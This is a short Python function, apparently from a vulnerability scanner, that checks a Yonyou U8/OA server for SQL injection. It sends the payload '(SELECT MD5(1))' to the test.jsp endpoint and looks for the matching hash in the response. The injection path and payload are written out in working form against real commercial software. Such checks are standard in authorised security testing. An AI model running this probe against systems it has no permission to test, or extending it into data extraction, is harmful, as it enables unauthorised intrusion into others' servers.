import requests

def exp_check(target_url):
    print('[*]正在检测用友U8的test.jsp是否存在SQL注入漏洞')
    url = target_url + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            # print('[SUCCESS]该系统可能存在SQL注入漏洞，具体URL为: {}\n'.format(url))
            return 1
        else:
            # print('[WARNING]该系统的用友U8不存在SQL注入\n')
            return 2
    except:
        # print('[WARNING]该系统无法连接\n')
        return 3

